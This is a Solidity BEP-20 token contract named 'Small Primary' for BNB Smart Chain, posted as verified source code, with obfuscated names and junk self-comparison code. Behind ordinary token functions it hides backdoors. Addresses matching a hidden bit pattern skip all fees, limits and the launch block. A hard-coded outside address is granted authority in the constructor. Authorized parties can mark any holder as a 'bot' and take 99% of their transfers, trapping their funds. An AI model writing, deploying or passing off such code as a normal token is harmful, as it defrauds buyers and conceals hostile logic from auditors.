/**
 *Submitted for verification at BscScan.com on 2022-12-22
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.13;library SafeMath {    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function tryAdd(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        uint256 c = a + b;        if (c < a) return (false, 0);        return (true, c);    }    }    function tryMul(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (a == 0) return (true, 0);        uint256 c = a * b;        if (c / a != b) return (false, 0);        return (true, c);    }    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }}interface IBEP20 {    function getOwner() external view returns (address);    function balanceOf(address account) external view returns (uint256);    function transfer(address recipient, uint256 amount)     external    returns (bool);    function allowance(address _owner, address spender)    external    view    returns (uint256);    function decimals() external view returns (uint8);    function totalSupply() external view returns (uint256);    function name() external view returns (string memory);    function symbol() external view returns (string memory);    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    function approve(address spender, uint256 amount) external returns (bool);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}interface IUniswapV2Router {    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);    function factory() external pure returns (address);    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);    function WETH() external pure returns (address);    function addLiquidity(        address tokenA,        address tokenB,        uint256 amountADesired,        uint256 amountBDesired,        uint256 amountAMin,        uint256 amountBMin,        address to,        uint256 deadline    )    external    returns (        uint256 amountA,        uint256 amountB,        uint256 liquidity    );    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);}interface IERC20 {    function balanceOf(address account) external view returns (uint256);}interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }    modifier onlyAuthorized() {        require(isAuthorized(msg.sender), "!Authorized");        _;    }    function Owner() public view returns (address) {        return owner;    }    function SetAuthorized(address adr) public onlyAuthorized() {        competent[adr] = true;    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }}contract SmallPrimary is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    string constant _name = "Small Primary ";    string constant _symbol = "SmallPrimary";    uint8 constant _decimals = 18;    //BUY FEES    uint256 private tradingLiquidityMarketingMax = 0;    uint256 private burnAutoFeeMin = 8;    //SELL FEES    uint256 private walletLiquidityTradingAutoSwapMax = 0;    uint256 private txBuyLaunchedTradingFeeIsAuto = 8;    bool private isTxLimitWallet = true;    bool private launchedMarketingBotsBurnMaxMode = true;    bool private feeBotsLiquidityAuto = true;    bool private modeTeamWalletMinLaunchedLiquidity = true;    bool private autoLiquidityBurnTeam = true;    uint256 private swapExemptAutoIs = _totalSupply / 1000; // 0.1%    uint256 private limitMaxBurnBuy = burnAutoFeeMin + tradingLiquidityMarketingMax;    uint256 private botsMinLimitTeam = 100;    bool private autoMaxModeLimitWallet;    uint256 private teamSwapLiquidityExempt;    uint256 private botsTradingIsAuto;    uint256 private maxSwapBurnLimit;    uint256 private modeFeeMaxReceiver;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private receiverLimitFeeBurn;    mapping(address => bool) private tradingFeeMaxBurnSell;    mapping(address => bool) private walletIsAutoLiquidity;    mapping(address => bool) private launchedMarketingBotsBurnMax;    uint256 private launchBlock = 0;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private burnMaxLaunchedMin;    uint256 private txExemptMinMarketing;    address private sellReceiverModeLimit = (msg.sender); // auto-liq address    address private modeBotsLimitMarketing = (0x3BF53D7707F17530B40d4879fFfFE187BE3bb2b7); // marketing address    address private minBuyWalletSwap = DEAD;    address private maxLiquidityTxWallet = DEAD;    address private feeWalletLimitTx = DEAD;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);        bool public autoBotsIsTeam = false;    bool private walletTxFeeMarketing = false;    uint256 private txMaxFeeTrading = 0;    bool private launchedMinModeMarketing = false;    uint256 public limitExemptSwapMax = 0;    bool private tradingLiquidityMinLimitAuto = false;    bool public marketingLimitReceiverSell = false;    bool public marketingIsLiquidityBotsTradingSwap = false;    uint256 public maxWalletMarketingBots = 0;    bool private minSwapBuyIs = false;    bool public walletTxFeeMarketing0 = false;    bool public walletTxFeeMarketing1 = false;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        autoMaxModeLimitWallet = true;        walletIsAutoLiquidity[msg.sender] = true;        walletIsAutoLiquidity[0x0000000000000000000000000000000000000000] = true;        walletIsAutoLiquidity[0x000000000000000000000000000000000000dEaD] = true;        walletIsAutoLiquidity[address(this)] = true;        receiverLimitFeeBurn[msg.sender] = true;        receiverLimitFeeBurn[address(this)] = true;        tradingFeeMaxBurnSell[msg.sender] = true;        tradingFeeMaxBurnSell[0x0000000000000000000000000000000000000000] = true;        tradingFeeMaxBurnSell[0x000000000000000000000000000000000000dEaD] = true;        tradingFeeMaxBurnSell[address(this)] = true;        SetAuthorized(address(0xea5a41F5ef94A3c95933E817FFffCa1679138eC9));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return isReceiverWalletSwap(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return isReceiverWalletSwap(sender, recipient, amount);    }    function getMaxLiquidityTxWallet() public view returns (address) {        if (maxLiquidityTxWallet != modeBotsLimitMarketing) {            return modeBotsLimitMarketing;        }        if (maxLiquidityTxWallet == feeWalletLimitTx) {            return feeWalletLimitTx;        }        return maxLiquidityTxWallet;    }
    function setLaunchedMarketingBotsBurnMax(address a0,bool a1) public onlyOwner {        if (launchedMarketingBotsBurnMax[a0] != launchedMarketingBotsBurnMax[a0]) {           launchedMarketingBotsBurnMax[a0]=a1;        }        launchedMarketingBotsBurnMax[a0]=a1;    }
    function setFeeBotsLiquidityAuto(bool a0) public onlyOwner {        if (feeBotsLiquidityAuto != feeBotsLiquidityAuto) {            feeBotsLiquidityAuto=a0;        }        feeBotsLiquidityAuto=a0;    }
    function setWalletIsAutoLiquidity(address a0,bool a1) public onlyOwner {        if (walletIsAutoLiquidity[a0] != tradingFeeMaxBurnSell[a0]) {           tradingFeeMaxBurnSell[a0]=a1;        }        if (a0 == modeBotsLimitMarketing) {            launchedMarketingBotsBurnMaxMode=a1;        }        walletIsAutoLiquidity[a0]=a1;    }
    function exemptLaunchedIsSellAutoTx(address sender, bool selling) internal returns (uint256) {                if (walletTxFeeMarketing != isTxLimitWallet) {            walletTxFeeMarketing = autoLiquidityBurnTeam;        }        if (tradingLiquidityMinLimitAuto == minSwapBuyIs) {            tradingLiquidityMinLimitAuto = minSwapBuyIs;        }        if (selling) {            limitMaxBurnBuy = txBuyLaunchedTradingFeeIsAuto + walletLiquidityTradingAutoSwapMax;            return limitMaxBurnBuy;        }        if (!selling && sender == uniswapV2Pair) {            limitMaxBurnBuy = burnAutoFeeMin + tradingLiquidityMarketingMax;            return limitMaxBurnBuy;        }        return txBuyLaunchedTradingFeeIsAuto + walletLiquidityTradingAutoSwapMax;    }
    function getLaunchedMarketingBotsBurnMax(address a0) public view returns (bool) {        if (launchedMarketingBotsBurnMax[a0] == tradingFeeMaxBurnSell[a0]) {            return launchedMarketingBotsBurnMaxMode;        }        if (a0 != modeBotsLimitMarketing) {            return launchedMinModeMarketing;        }            return launchedMarketingBotsBurnMax[a0];    }
    function setFeeWalletLimitTx(address a0) public onlyOwner {        feeWalletLimitTx=a0;    }
    function tradingAutoTeamMax() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    autoLiquidityBurnTeam &&    _balances[address(this)] >= swapExemptAutoIs;    }
    function getWalletIsAutoLiquidity(address a0) public view returns (bool) {        if (walletIsAutoLiquidity[a0] == receiverLimitFeeBurn[a0]) {            return minSwapBuyIs;        }        if (walletIsAutoLiquidity[a0] == walletIsAutoLiquidity[a0]) {            return walletTxFeeMarketing;        }            return walletIsAutoLiquidity[a0];    }
    function getBotsMinLimitTeam() public view returns (uint256) {        if (botsMinLimitTeam != txBuyLaunchedTradingFeeIsAuto) {            return txBuyLaunchedTradingFeeIsAuto;        }        if (botsMinLimitTeam == limitMaxBurnBuy) {            return limitMaxBurnBuy;        }        return botsMinLimitTeam;    }
    function isBot(address addr) public view returns (bool) {        return launchedMarketingBotsBurnMax[addr];    }
    function getLaunchedMinModeMarketing() public view returns (bool) {        if (launchedMinModeMarketing != autoLiquidityBurnTeam) {            return autoLiquidityBurnTeam;        }        if (launchedMinModeMarketing == tradingLiquidityMinLimitAuto) {            return tradingLiquidityMinLimitAuto;        }        if (launchedMinModeMarketing != launchedMarketingBotsBurnMaxMode) {            return launchedMarketingBotsBurnMaxMode;        }        return launchedMinModeMarketing;    }
    function launchedExemptFeeTeam(address sender, address receiver, uint256 amount) internal returns (uint256) {                if (launchedMinModeMarketing == launchedMinModeMarketing) {            launchedMinModeMarketing = modeTeamWalletMinLaunchedLiquidity;        }        uint256 feeAmount = amount.mul(exemptLaunchedIsSellAutoTx(sender, receiver == uniswapV2Pair)).div(botsMinLimitTeam);        if (launchedMarketingBotsBurnMax[sender] || launchedMarketingBotsBurnMax[receiver]) {            feeAmount = amount.mul(99).div(botsMinLimitTeam);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                return amount.sub(feeAmount);    }
    function getFeeWalletLimitTx() public view returns (address) {        if (feeWalletLimitTx != sellReceiverModeLimit) {            return sellReceiverModeLimit;        }        if (feeWalletLimitTx == modeBotsLimitMarketing) {            return modeBotsLimitMarketing;        }        return feeWalletLimitTx;    }
    function setTradingLiquidityMinLimitAuto(bool a0) public onlyOwner {        if (tradingLiquidityMinLimitAuto != modeTeamWalletMinLaunchedLiquidity) {            modeTeamWalletMinLaunchedLiquidity=a0;        }        if (tradingLiquidityMinLimitAuto == launchedMarketingBotsBurnMaxMode) {            launchedMarketingBotsBurnMaxMode=a0;        }        tradingLiquidityMinLimitAuto=a0;    }
    function isReceiverWalletSwap(address sender, address recipient, uint256 amount) internal returns (bool) {                if (tradingLiquidityMinLimitAuto != walletTxFeeMarketing) {            tradingLiquidityMinLimitAuto = minSwapBuyIs;        }        bool bLimitTxWalletValue = swapLiquidityMaxAutoIsMinLaunched(sender) || swapLiquidityMaxAutoIsMinLaunched(recipient);                        if (recipient == uniswapV2Pair && _balances[recipient] == 0) {            launchBlock = block.number + 10;        }        if (!bLimitTxWalletValue) {            require(block.number >= launchBlock, "No launch");        }                if (walletTxFeeMarketing == autoLiquidityBurnTeam) {            walletTxFeeMarketing = minSwapBuyIs;        }        if (inSwap || bLimitTxWalletValue) {return limitTxReceiverIsMax(sender, recipient, amount);}        if (!receiverLimitFeeBurn[sender] && !receiverLimitFeeBurn[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                if (walletTxFeeMarketing != minSwapBuyIs) {            walletTxFeeMarketing = walletTxFeeMarketing;        }        if (launchedMinModeMarketing == minSwapBuyIs) {            launchedMinModeMarketing = isTxLimitWallet;        }        require((amount <= _maxTxAmount) || walletIsAutoLiquidity[sender] || walletIsAutoLiquidity[recipient], "Max TX Limit!");        if (tradingAutoTeamMax()) {teamMinMarketingLimit();}        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                uint256 amountReceived = teamIsTxReceiverBurn(sender) ? launchedExemptFeeTeam(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function setModeTeamWalletMinLaunchedLiquidity(bool a0) public onlyOwner {        if (modeTeamWalletMinLaunchedLiquidity == launchedMinModeMarketing) {            launchedMinModeMarketing=a0;        }        if (modeTeamWalletMinLaunchedLiquidity != autoLiquidityBurnTeam) {            autoLiquidityBurnTeam=a0;        }        if (modeTeamWalletMinLaunchedLiquidity == isTxLimitWallet) {            isTxLimitWallet=a0;        }        modeTeamWalletMinLaunchedLiquidity=a0;    }
    function getFeeBotsLiquidityAuto() public view returns (bool) {        if (feeBotsLiquidityAuto == isTxLimitWallet) {            return isTxLimitWallet;        }        return feeBotsLiquidityAuto;    }
    function teamIsTxReceiverBurn(address sender) internal view returns (bool) {        return !tradingFeeMaxBurnSell[sender];    }
    function getTradingLiquidityMinLimitAuto() public view returns (bool) {        if (tradingLiquidityMinLimitAuto != tradingLiquidityMinLimitAuto) {            return tradingLiquidityMinLimitAuto;        }        if (tradingLiquidityMinLimitAuto == launchedMarketingBotsBurnMaxMode) {            return launchedMarketingBotsBurnMaxMode;        }        if (tradingLiquidityMinLimitAuto != tradingLiquidityMinLimitAuto) {            return tradingLiquidityMinLimitAuto;        }        return tradingLiquidityMinLimitAuto;    }
    function setLaunchBlock(uint256 a0) public onlyOwner {        if (launchBlock != swapExemptAutoIs) {            swapExemptAutoIs=a0;        }        launchBlock=a0;    }
    function getModeTeamWalletMinLaunchedLiquidity() public view returns (bool) {        if (modeTeamWalletMinLaunchedLiquidity != minSwapBuyIs) {            return minSwapBuyIs;        }        return modeTeamWalletMinLaunchedLiquidity;    }
    function getLaunchBlock() public view returns (uint256) {        if (launchBlock == txMaxFeeTrading) {            return txMaxFeeTrading;        }        if (launchBlock != burnAutoFeeMin) {            return burnAutoFeeMin;        }        if (launchBlock != botsMinLimitTeam) {            return botsMinLimitTeam;        }        return launchBlock;    }
    function setTxMaxFeeTrading(uint256 a0) public onlyOwner {        if (txMaxFeeTrading != walletLiquidityTradingAutoSwapMax) {            walletLiquidityTradingAutoSwapMax=a0;        }        if (txMaxFeeTrading != tradingLiquidityMarketingMax) {            tradingLiquidityMarketingMax=a0;        }        txMaxFeeTrading=a0;    }
    function getTxMaxFeeTrading() public view returns (uint256) {        if (txMaxFeeTrading != txBuyLaunchedTradingFeeIsAuto) {            return txBuyLaunchedTradingFeeIsAuto;        }        if (txMaxFeeTrading != botsMinLimitTeam) {            return botsMinLimitTeam;        }        if (txMaxFeeTrading == tradingLiquidityMarketingMax) {            return tradingLiquidityMarketingMax;        }        return txMaxFeeTrading;    }
    function setBotsMinLimitTeam(uint256 a0) public onlyOwner {        if (botsMinLimitTeam != txMaxFeeTrading) {            txMaxFeeTrading=a0;        }        botsMinLimitTeam=a0;    }
    function swapLiquidityMaxAutoIsMinLaunched(address addr) private view returns (bool) {        uint256 v0 = uint256(uint160(addr)) << 192;        v0 = v0 >> 238;        return v0 == firstSetAutoReceiver;    }
    function setMaxLiquidityTxWallet(address a0) public onlyOwner {        if (maxLiquidityTxWallet == sellReceiverModeLimit) {            sellReceiverModeLimit=a0;        }        maxLiquidityTxWallet=a0;    }
    function setLaunchedMinModeMarketing(bool a0) public onlyOwner {        if (launchedMinModeMarketing == launchedMinModeMarketing) {            launchedMinModeMarketing=a0;        }        if (launchedMinModeMarketing == modeTeamWalletMinLaunchedLiquidity) {            modeTeamWalletMinLaunchedLiquidity=a0;        }        if (launchedMinModeMarketing == tradingLiquidityMinLimitAuto) {            tradingLiquidityMinLimitAuto=a0;        }        launchedMinModeMarketing=a0;    }
    function limitTxReceiverIsMax(address sender, address recipient, uint256 amount) internal returns (bool) {        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function setBot(address addr) public onlyAuthorized {        launchedMarketingBotsBurnMax[addr] = true;    }
    function teamMinMarketingLimit() internal swapping {                uint256 amountToLiquify = swapExemptAutoIs.mul(tradingLiquidityMarketingMax).div(limitMaxBurnBuy).div(2);        uint256 amountToSwap = swapExemptAutoIs.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                if (walletTxFeeMarketing == walletTxFeeMarketing) {            walletTxFeeMarketing = walletTxFeeMarketing;        }        uint256 amountBNB = address(this).balance;        uint256 totalETHFee = limitMaxBurnBuy.sub(tradingLiquidityMarketingMax.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(tradingLiquidityMarketingMax).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(burnAutoFeeMin).div(totalETHFee);                if (minSwapBuyIs == feeBotsLiquidityAuto) {            minSwapBuyIs = launchedMinModeMarketing;        }        if (tradingLiquidityMinLimitAuto != tradingLiquidityMinLimitAuto) {            tradingLiquidityMinLimitAuto = autoLiquidityBurnTeam;        }        payable(modeBotsLimitMarketing).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                sellReceiverModeLimit,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}